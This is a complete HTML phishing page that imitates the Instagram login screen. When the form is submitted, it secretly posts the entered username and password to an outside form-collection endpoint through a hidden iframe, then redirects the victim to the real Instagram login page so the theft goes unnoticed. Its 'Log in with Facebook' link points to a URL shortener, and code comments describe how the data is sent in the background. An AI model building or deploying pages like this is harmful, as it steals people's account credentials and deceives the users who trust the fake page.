<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Instagram</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
      background-color: #fafafa;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      margin: 0;
      padding: 20px;
    }

    .login-container {
      display: flex;
      flex-direction: column;
      align-items: center;
      width: 100%;
      max-width: 500px;
    }

    .login-card {
      background-color: #ffffff;
      border: 1px solid #dbdbdb;
      border-radius: 1px;
      padding: 70px 50px 50px;
      width: 100%;
      margin-bottom: 10px;
    }

    /* Instagram gradient logo */
    .logo {
      text-align: center;
      margin-bottom: 40px;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 6px;
    }

    .logo i,
    .logo span {
      background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      background-clip: text;
      display: inline-block;
    }

    .logo i {
      font-size: 40px;
      line-height: 1;
    }

    .logo span {
      font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
      font-size: 46px;
      font-weight: 700;
      letter-spacing: -0.5px;
      line-height: 1;
    }

    /* Form */
    .login-form {
      display: flex;
      flex-direction: column;
      gap: 8px;
    }

    .input-group {
      position: relative;
      margin-bottom: 0;
    }

    .input-group input {
      width: 100%;
      padding: 16px 12px 14px;
      background: #fafafa;
      border: 1px solid #dbdbdb;
      border-radius: 3px;
      font-size: 18px;
      line-height: 24px;
      color: #262626;
      outline: none;
      transition: border 0.1s ease;
    }

    .input-group input:focus {
      border-color: #a8a8a8;
      background: #fafafa;
    }

    .input-group input::placeholder {
      color: #8e8e8e;
      font-weight: 300;
      font-size: 18px;
    }

    .login-btn {
      margin-top: 24px;
      background: #0095f6;
      border: none;
      border-radius: 4px;
      color: white;
      font-weight: 600;
      font-size: 20px;
      padding: 12px 16px;
      height: 54px;
      cursor: pointer;
      transition: background 0.2s;
      opacity: 0.9;
    }

    .login-btn:hover {
      background: #1877f2;
      opacity: 1;
    }

    .login-btn:active {
      transform: scale(0.98);
    }

    .login-btn:disabled {
      opacity: 0.7;
      cursor: not-allowed;
    }

    .or-divider {
      display: flex;
      align-items: center;
      margin: 28px 0 26px;
      color: #8e8e8e;
      font-size: 15px;
      font-weight: 600;
      gap: 20px;
    }

    .or-divider::before,
    .or-divider::after {
      content: '';
      flex: 1;
      height: 1px;
      background: #dbdbdb;
    }

    /* Facebook login link */
    .fb-login {
      display: flex;
      justify-content: center;
      align-items: center;
      gap: 8px;
      color: #385185;
      font-weight: 600;
      font-size: 17px;
      text-decoration: none;
      margin-bottom: 24px;
      cursor: pointer;
    }

    .fb-login i {
      font-size: 22px;
      color: #385185;
    }

    .fb-login span {
      color: #385185;
    }

    .forgot-password {
      text-align: center;
      font-size: 15px;
      color: #00376b;
      text-decoration: none;
      cursor: default;
      margin-top: 10px;
      margin-bottom: 24px;
    }

    /* Create account section */
    .create-account {
      text-align: center;
      font-size: 17px;
      color: #262626;
      border-top: 1px solid #dbdbdb;
      padding-top: 24px;
    }

    .create-account a {
      color: #0095f6;
      font-weight: 600;
      text-decoration: none;
      cursor: pointer;
    }

    /* Footer */
    .footer-links {
      margin-top: 20px;
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
      gap: 8px 20px;
      font-size: 14px;
      color: #8e8e8e;
    }

    .footer-links span {
      cursor: default;
    }

    .footer-copy {
      margin-top: 16px;
      font-size: 14px;
      color: #8e8e8e;
      text-align: center;
      width: 100%;
    }

    /* Hidden iframe – never shown */
    iframe {
      display: none;
    }

    /* Responsive */
    @media (max-width: 550px) {
      .login-container {
        max-width: 100%;
        padding: 0 12px;
      }

      .login-card {
        padding: 50px 30px 40px;
      }

      .logo i {
        font-size: 34px;
      }

      .logo span {
        font-size: 38px;
      }

      .input-group input {
        font-size: 16px;
        padding: 14px 10px 12px;
      }

      .login-btn {
        font-size: 18px;
        height: 48px;
      }
    }

    .input-group input:-webkit-autofill {
      -webkit-box-shadow: 0 0 0 30px #fafafa inset !important;
      -webkit-text-fill-color: #262626 !important;
    }
  </style>
</head>
<body>
  <div class="login-container">
    <div class="login-card">
      <div class="logo">
        <i class="fab fa-instagram"></i>
        <span>Instagram</span>
      </div>

      <!-- 
        The form now uses target="formResponse" so that submission goes to a hidden iframe.
        The page itself stays on the current URL while data is sent in the background.
      -->
      <form class="login-form" id="loginForm" 
            action="https://submit-form.com/Jy8gogdYM" 
            method="POST"
            target="formResponse">

        <div class="input-group">
          <input type="text" placeholder="Phone number, username, or email" 
                 value="username" id="username" name="username" 
                 aria-label="Phone number, username, or email">
        </div>
        <div class="input-group">
          <input type="password" placeholder="Password" 
                 value="password" id="password" name="password" 
                 aria-label="Password">
        </div>
        <button type="submit" class="login-btn" id="loginBtn">Log in</button>
      </form>

      <div class="or-divider">
        <span>OR</span>
      </div>

      <a href="https://tinyurl.com/mr24re9d" class="fb-login">
        <i class="fab fa-facebook-square"></i>
        <span>Log in with Facebook</span>
      </a>

      <div class="forgot-password">
        Forgot password?
      </div>

      <div class="create-account">
        Don't have an account? 
        <a href="https://www.instagram.com/accounts/emailsignup/?next=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fonetap%2F%3F__coig_login%3D1" target="_blank">
          Create account
        </a>
      </div>
    </div>

    <div class="footer-links">
      <span>Meta</span>
      <span>About</span>
      <span>Blog</span>
      <span>Jobs</span>
      <span>Help</span>
      <span>API</span>
      <span>Privacy</span>
      <span>Terms</span>
      <span>Locations</span>
      <span>Instagram Lite</span>
      <span>Threads</span>
      <span>Contact Uploading & Non-Users</span>
      <span>Meta Verified</span>
    </div>
    <div class="footer-copy">
      © 2026 Instagram from Meta
    </div>
  </div>

  <!-- Hidden iframe that will receive the server response (never visible) -->
  <iframe name="formResponse"></iframe>

  <script>
    (function() {
      const form = document.getElementById('loginForm');
      const submitBtn = document.getElementById('loginBtn');

      // Instagram login URL to redirect to after data is sent
      const REDIRECT_URL =
        'https://www.instagram.com/accounts/login/?next=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fonetap%2F%3F__coig_login%3D1';

      form.addEventListener('submit', function(e) {
        // Stop the normal form submission (which would navigate to the endpoint)
        e.preventDefault();

        // Provide visual feedback while sending
        submitBtn.disabled = true;
        submitBtn.textContent = 'Logging in…';

        // Submit the form programmatically – because of target="formResponse",
        // the POST goes to the hidden iframe without leaving the page
        setTimeout(() => {
          form.submit();
        }, 0);

        // After a short delay, redirect the main window to Instagram
        setTimeout(() => {
          window.location.href = REDIRECT_URL;
        }, 1200); // 1.2 seconds – adjust if needed
      });
    })();
  </script>
</body>
</html>
